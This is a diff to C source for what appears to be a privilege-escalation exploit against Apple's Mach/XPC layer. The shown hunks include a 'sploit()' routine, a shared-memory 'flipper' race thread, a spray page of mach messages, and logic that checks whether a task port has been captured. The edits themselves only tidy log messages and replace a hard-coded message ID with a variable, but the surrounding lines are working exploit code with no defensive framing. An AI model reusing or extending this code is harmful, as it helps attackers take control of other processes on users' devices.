@@ -42,7 +42,7 @@ extern kern_return_t mach_vm_allocate
  );
 
 uint64_t jmpbuf_and_jop_addr = 0;
-
+mach_msg_id_t msgh_id = 0x0;
 
 /* 
   returns a send right to a mach_memory_entry port
@@ -409,8 +409,8 @@ check_if_we_got_task_port(
   
   if (err == KERN_SUCCESS) {
       printf("[INFO]: Got task port message\n");
-    if (msg.hdr.msgh_id == 0x12344321) {
-      printf("task port: %x\n", msg.hdr.msgh_remote_port);
+    if (msg.hdr.msgh_id == msgh_id) {
+      printf("[INFO]: task port: %x\n", msg.hdr.msgh_remote_port);
       return msg.hdr.msgh_remote_port;
     }
   }
@@ -660,7 +660,7 @@ uint64_t build_spray_page() {
     msg->msgh_remote_port = target_send_right;
     msg->msgh_local_port = 0x103; // send a send right to the task port as the reply port
     msg->msgh_voucher_port = MACH_PORT_NULL;
-    msg->msgh_id = 0x12344321;
+    msg->msgh_id = msgh_id;
     
     msg++;
     target_send_right += 4;
@@ -829,7 +829,7 @@ static mach_port_t sploit() {
     &shm_size,
     &flipper); // this is the pointer into shared memory
 
-  printf("shm_port: %x\nshm_size: %zx\n", shm_port, shm_size);
+  printf("[INFO]: shm_port: %x - shm_size: %zx\n", shm_port, shm_size);
 
   // start the flipper thread
   pthread_t th;
@@ -870,9 +870,7 @@ static mach_port_t sploit() {
       printf("failed to connect to xpc service\n");
       exit(EXIT_FAILURE);
     }
-
-//    printf("client port: %x\n", client_port);
-//    printf("reply port: %x\n", reply_port);
+      
 #if 0
     // send that xpc_msg_dict as a mach message to the service client port:
     kern_return_t mach_err;
@@ -882,9 +880,7 @@ static mach_port_t sploit() {
       exit(EXIT_FAILURE);
     }
     printf("sent message!\n"); 
-
-//    printf("client port: %x\n", client_port);
-//    printf("reply port: %x\n", reply_port);
+      
 #endif
 
     exploit_message->msgh_remote_port = client_port;
@@ -950,7 +946,7 @@ static mach_port_t sploit() {
           
           if(try_count > 30000) {
               
-              printf("[ERROR]: Too many tries. Failed.\n");
+              printf("[ERROR]: Too many attempts. Failed.\n");
               
               // Clean and quit
               mach_port_destroy(mach_task_self(), notify_q);
@@ -971,7 +967,6 @@ static mach_port_t sploit() {
 
         break;
       }
-        
         try_count++;
     }
   }
